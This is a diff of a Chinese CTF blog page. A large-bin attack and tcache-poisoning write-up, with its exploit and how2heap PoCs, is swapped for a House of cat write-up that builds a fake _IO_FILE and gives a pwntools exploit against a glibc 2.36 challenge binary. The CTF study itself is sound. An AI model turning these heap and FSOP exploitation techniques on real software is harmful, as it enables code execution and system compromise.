@@ -111,10 +111,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://sagiring.github.io/cn/Sagiring_markdown/LargebinsAttact与TcachebinsPosioning/">
+  <link rel="canonical" href="https://sagiring.github.io/cn/Sagiring_markdown/House of cat/">
   <title>
     
-      LargebinsAttact与TcachebinsPosioning - 茗茗之中的blog
+      House of cat - 茗茗之中的blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -356,11 +356,11 @@
               <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
               
             </div>
-            <h1>LargebinsAttact与TcachebinsPosioning</h1>
+            <h1>House of cat</h1>
             <h2 class="subheading"></h2>
             <span class="meta">
               Posted by 茗 on
-              2023-11-02
+              2023-11-14
             </span>
 
 
@@ -368,11 +368,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">8</span> Minutes
+              Estimated Reading Time <span class="post-count">5</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">1.5k</span> In Total
+              Words <span class="post-count">1.1k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,264 +420,183 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="largebinsattact与tcachebinsposioning">LargebinsAttact与TcachebinsPosioning</h1>
-<p>复现hgame_week3 - large_note</p>
-<p>环境 glibc-2.32</p>
+        <h1 id="house-of-cat">House of cat</h1>
+<p>复现hgame week4 4nswer's gift</p>
 <h2 id="题目">题目</h2>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230622137.png"></p>
-<p>看下菜单</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230711043.png"></p>
-<p>Add-note 限制了malloc大小 0x500 - 0x900</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230750205.png"></p>
-<p>Delete-note 没有限制</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230832483.png"></p>
-<p>Edit-note 没有限制</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230849531.png"></p>
-<p>Show-note 没有限制</p>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230918914.png"></p>
-<h2 id="section"></h2>
+<h3 id="glibc版本-2.36">glibc版本 2.36</h3>
+<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104111534552.png"></p>
+<h3 id="程序逻辑">程序逻辑</h3>
+<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104111625351.png"></p>
+<p>给了_IO_list_all的写入机会，且大小随意指定<code>malloc</code></p>
 <h2 id="解题思路">解题思路</h2>
-<p>目标明确打largebin_attack往任意地点写大数。</p>
-<p>首先通过unsortedbins泄露libc和heap</p>
-<pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x728</span>)
-add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)
-add(<span class="hljs-number">2</span>,<span class="hljs-number">0x718</span>)
-add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)
+<p>首先有泄露libc地址。</p>
+<p>可以向malloc要一块很大的内存，让malloc调用mmap开辟空间。开辟出来的空间与libc偏移一致，fake_io便已知。</p>
+<p>高版本glibc 考虑打house of cat且有exit使用FSOP触发。</p>
+<h3 id="io_file_plus结构">_IO_FILE_plus结构</h3>
+<pre><code class="hljs python">fake_IO_FILE=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>         <span class="hljs-comment">#0x0   _flags </span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x8   _IO_read_ptr</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x10  _IO_read_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x18  _IO_read_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x20  _IO_write_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">1</span>)                <span class="hljs-comment">#0x28  _IO_write_ptr</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x30  _IO_write_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x38  _IO_buf_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x40  _IO_buf_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x48  _IO_save_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x50  _IO_backup_base</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x58  _IO_save_end</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x60  _markers</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x68  _chain</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span>             <span class="hljs-comment">#0x70  _fileno</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span>             <span class="hljs-comment">#0x74  _flags2</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x78  _old_offset</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>           <span class="hljs-comment">#0x80  _cur_column</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>               <span class="hljs-comment">#0x82  _vtable_offset</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">5</span>             <span class="hljs-comment">#0x83  _shortbuf</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x88  _lock</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x90  _offset</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x98  _codecvt</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xa0  _wide_data    </span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xa8  _freeres_list</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xb0  _freeres_bufr</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xb8  __pad5</span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>   <span class="hljs-comment">#0xc0  _mode        </span>
+fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>+ p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> <span class="hljs-comment">#0xc4  _unused2</span>
+fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xd8  vtable</span>
+</code></pre>
+<h3 id="house-of-cat-1">House of cat</h3>
+<p>触发IO函数的方式有FSOP、__malloc_assert</p>
+<p>通过修改vtable到虚表段中调用<code>_IO_wfile_seekof</code>-&gt;<code>_IO_switch_to_wget_mode</code></p>
+<p>其中<code>_IO_switch_to_wget_mode</code>的调用具体如下</p>
+<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104112654061.png"></p>
+<p>关键步骤如下。此时<code>rdi</code>为fp即我们伪造的fake_io结构，根据偏移构造地址，可以达到控制程序的目的。</p>
+<pre><code class="hljs assembly">mov rax, qword ptr [rdi + 0xa0]
+mov rdx, qword ptr [rax + 0x20]
+mov rax, qword ptr [rax + 0xe0]
+call qword ptr [rax + 0x18] //system、setcontext</code></pre>
+<p>可以调用system来<code>getshell</code>,也可以调用<code>setcontext</code>设置<code>rop</code>拿<code>flag</code></p>
+<p>在此之前我们的fake_io结构需要满足</p>
+<pre><code class="hljs c">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end</code></pre>
+<pre><code class="hljs c">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code></pre>
+<p>_wide_data可以指向自己的fake_io</p>
+<p><code>fp-&gt;_IO_save_base &lt; fp-&gt;_IO_backup_base</code> ---
+在<code>_wide_data=fake_io_addr+0x30</code>条件下,当然可以自主调整</p>
+<pre><code class="hljs c">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</code></pre>
+<pre><code class="hljs c">fp-&gt;_mode = <span class="hljs-number">0</span></code></pre>
+<h2 id="另外">另外</h2>
+<p>pwndbg可以直接b _IO_Fuction 来进行调试
+，也可以<code>p *(sruct _IO_FILE_plus *) 0x233333</code>或者p
+_IO_list_all来打印结构。</p>
+<h2 id="exp">Exp</h2>
+<p>最后贴出exp</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64
+<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
 
-delete(<span class="hljs-number">0</span>)
-edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)
-show(<span class="hljs-number">0</span>)
-libc.address = revc_addr(r,<span class="hljs-string">&#x27;main_arena&#x27;</span>) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - <span class="hljs-number">0x1e3c00</span>
+debug = <span class="hljs-number">1</span>
+gdb_is = <span class="hljs-number">1</span>
+elf_path = <span class="hljs-string">&quot;./vuln&quot;</span>
+<span class="hljs-comment"># context(arch=&#x27;i386&#x27;,os = &#x27;linux&#x27;)</span>
+context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;DEBUG&#x27;</span>)
+<span class="hljs-keyword">if</span> debug:
+    context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>,<span class="hljs-string">&#x27;nt&#x27;</span>,<span class="hljs-string">&#x27;Ubuntu&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]
+    <span class="hljs-keyword">if</span> gdb_is:
+        r = gdb.debug(<span class="hljs-string">&#x27;./vuln&#x27;</span>,<span class="hljs-string">&#x27;set debug-file-directory ./.debug/&#x27;</span>)
+        <span class="hljs-comment"># gdb.attach(r,&#x27;b* 0x4012ed&#x27;)</span>
+        <span class="hljs-comment"># gdb.attach(r)</span>
+        <span class="hljs-comment"># pause()</span>
+        <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">else</span>:
+        r = process(<span class="hljs-string">&quot;./vuln&quot;</span>)
+    
+<span class="hljs-keyword">else</span>:
+    host = <span class="hljs-string">&quot;192.168.0.111:53783&quot;</span>
+    r = connect(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>],host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#远程连接</span>
+    gdb_is =<span class="hljs-number">0</span>
+
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show_addr</span>(<span class="hljs-params">name,addr</span>):
+      success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span> = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(addr)&#125;</span>&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">revc_addr</span>(<span class="hljs-params">r:process,name:<span class="hljs-built_in">str</span>, until:<span class="hljs-built_in">bytes</span> =<span class="hljs-string">b&#x27;\x7f&#x27;</span>,offset:<span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>,addrType:<span class="hljs-built_in">str</span> =<span class="hljs-string">&#x27;bytes&#x27;</span></span>)-&gt;<span class="hljs-built_in">int</span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(until) == <span class="hljs-built_in">str</span>:
+        until = until.encode()
+    <span class="hljs-keyword">if</span> addrType == <span class="hljs-string">&#x27;bytes&#x27;</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> offset:
+            addr = u64(r.recvuntil(until).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+        <span class="hljs-keyword">else</span>:
+            addr = u64(r.recvuntil(until)[:offset].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+    <span class="hljs-keyword">elif</span> addrType == <span class="hljs-string">&#x27;str&#x27;</span>:
+        addr = <span class="hljs-built_in">int</span>(r.recvuntil(until)[<span class="hljs-number">2</span>:offset],<span class="hljs-number">16</span>)
+
+    show_addr(name,addr)
+    <span class="hljs-keyword">return</span> addr
+    
+libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+elf = ELF(elf_path)
+rop = ROP(elf)
+r.recvuntil(<span class="hljs-string">b&#x27;the box of it looks like this: &#x27;</span>)
+libc.address = revc_addr(r,<span class="hljs-string">b&#x27;_IO_list_all&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,-<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;str&#x27;</span>) - <span class="hljs-number">0x1f7660</span>
+size = <span class="hljs-number">0x20000000</span>
+
+
+r.sendlineafter(<span class="hljs-string">b&#x27;put into the gift?\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())
 show_addr(<span class="hljs-string">&#x27;libc.address&#x27;</span>,libc.address)
-edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)
 
-delete(<span class="hljs-number">2</span>)
-show(<span class="hljs-number">2</span>)
-heap_base = revc_addr(r,<span class="hljs-string">&#x27;heap&#x27;</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>,-<span class="hljs-number">1</span>) - <span class="hljs-number">0x290</span>
-show_addr(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)
-
-add(<span class="hljs-number">0</span>,<span class="hljs-number">0x728</span>)<span class="hljs-comment">#复原一下</span>
-add(<span class="hljs-number">2</span>,<span class="hljs-number">0x718</span>) <span class="hljs-comment">#复原一下</span></code></pre>
-<p>可以考虑改global_max_fast或者mp_.tcache_bins。首先需要知道这两个地方的偏移。两种方法。</p>
-<p>方法一利用gdb.debug启动后，使用<code>pwndbg</code>打印地址</p>
-<pre><code class="hljs python">r = gdb.debug(<span class="hljs-string">&#x27;./vuln&#x27;</span>,<span class="hljs-string">&#x27;set debug-file-directory ./.debug/&#x27;</span>)</code></pre>
-<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102231915130.png"></p>
-<p>方法二利用gdb.attach启动后，使用<code>pwndbg</code>
-<code>file</code>命令加载带有<code>debug</code>信息的<code>.so</code>，再打印。可以用glibc-all-in-one里的<code>.so</code></p>
-<p>largebin_attack in glibc2.32 可以看how2heap</p>
-<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span>
-
-<span class="hljs-comment">/*</span>
-<span class="hljs-comment"></span>
-<span class="hljs-comment">A revisit to large bin attack for after glibc2.30</span>
-<span class="hljs-comment"></span>
-<span class="hljs-comment">Relevant code snippet :</span>
-<span class="hljs-comment"></span>
-<span class="hljs-comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span>
-<span class="hljs-comment">		fwd = bck;</span>
-<span class="hljs-comment">		bck = bck-&gt;bk;</span>
-<span class="hljs-comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span>
-<span class="hljs-comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span>
-<span class="hljs-comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span>
-<span class="hljs-comment">	&#125;</span>
-<span class="hljs-comment"></span>
-<span class="hljs-comment"></span>
-<span class="hljs-comment">*/</span>
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
-  <span class="hljs-comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span>
-  setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);
-  setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);
-  setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 1 : \n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Check 2 : \n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This prevents the traditional large bin attack\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);
-  
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);
-
-  <span class="hljs-type">size_t</span> target = <span class="hljs-number">0</span>;
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);
-  <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);
-  <span class="hljs-type">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And another chunk to prevent consolidate\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);
-  <span class="hljs-type">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-built_in">free</span>(p1);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="hljs-number">-2</span>);
-  <span class="hljs-type">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-built_in">free</span>(p2);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="hljs-number">-2</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="hljs-number">-4</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-type">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, p1<span class="hljs-number">-2</span>, p2<span class="hljs-number">-2</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="hljs-number">-2</span>, (<span class="hljs-type">void</span> *)target);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="hljs-type">size_t</span>*)target);
-
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================================================================\n\n&quot;</span>);
-
-  assert((<span class="hljs-type">size_t</span>)(p2<span class="hljs-number">-2</span>) == target);
-
-  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-&#125;</code></pre>
-<p>贴出相应exp</p>
-<pre><code class="hljs python">global_max_fast_addr = libc.address + <span class="hljs-number">0x1e6e98</span>
-mp_tcachebins_addr = libc.address + <span class="hljs-number">0x1e32d0</span>
-delete(<span class="hljs-number">0</span>)
-add(<span class="hljs-number">4</span>,<span class="hljs-number">0x738</span>)
-delete(<span class="hljs-number">2</span>)
-show_addr(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)
-edit(<span class="hljs-number">0</span>,p64(libc.address+<span class="hljs-number">0x1e40b0</span>) + p64(libc.address+<span class="hljs-number">0x1e40b0</span>)+ p64(heap_base+<span class="hljs-number">0x290</span>) + p64(mp_tcachebins_addr - <span class="hljs-number">0x20</span>))
-show_addr(<span class="hljs-string">&#x27;global_max_fast_addr&#x27;</span>,global_max_fast_addr)
-show_addr(<span class="hljs-string">&#x27;mp_tcachebins_addr&#x27;</span>,mp_tcachebins_addr)
-add(<span class="hljs-number">5</span>,<span class="hljs-number">0x738</span>)
-<span class="hljs-comment"># fastbin_ptr= libc.address + 0x1e3c00 + 8</span>
-<span class="hljs-comment"># idx=(libc.sym[&#x27;__free_hook&#x27;]-fastbin_ptr)/8</span>
-<span class="hljs-comment"># size=idx*0x10+0x20</span>
-<span class="hljs-comment"># show_addr(&#x27;size&#x27;,int(size))</span>
-<span class="hljs-comment"># size = 0x6490 size过大 直接global_max_fast改不了</span>
-<span class="hljs-comment"># 改完分配不了内存 malloc(): memory corruption (fast)</span>
-<span class="hljs-comment">#换tcachebins</span>
-<span class="hljs-comment">#打tcache_posioning</span></code></pre>
-<p>经过尝试后改global_max_fast之后无法分配内存，报错<em>malloc(): memory
-corruption (fast)</em>原因尚待探究。</p>
-<p>换打mp_.tcache_bins，启用tcachebins。考虑打tcachebins_posioning.同样贴出how2heap</p>
-<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span>
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
-&#123;
-	<span class="hljs-comment">// disable buffering</span>
-	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
-	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
-
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span>
-		   <span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>
-		   <span class="hljs-string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span>
-		   <span class="hljs-string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span>
-		   <span class="hljs-string">&quot;An heap address leak is needed to perform tcache poisoning.\n&quot;</span>
-		   <span class="hljs-string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);
-
-	<span class="hljs-type">size_t</span> stack_var[<span class="hljs-number">0x10</span>];
-	<span class="hljs-type">size_t</span> *target = <span class="hljs-literal">NULL</span>;
-
-	<span class="hljs-comment">// choose a properly aligned target address</span>
-	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++) &#123;
-		<span class="hljs-keyword">if</span>(((<span class="hljs-type">long</span>)&amp;stack_var[i] &amp; <span class="hljs-number">0xf</span>) == <span class="hljs-number">0</span>) &#123;
-			target = &amp;stack_var[i];
-			<span class="hljs-keyword">break</span>;
-		&#125;
-	&#125;
-	assert(target != <span class="hljs-literal">NULL</span>);
-
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, target);
-
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating 2 buffers.\n&quot;</span>);
-	<span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, a);
-	<span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, b);
-
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the buffers...\n&quot;</span>);
-	<span class="hljs-built_in">free</span>(a);
-	<span class="hljs-built_in">free</span>(b);
-
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);
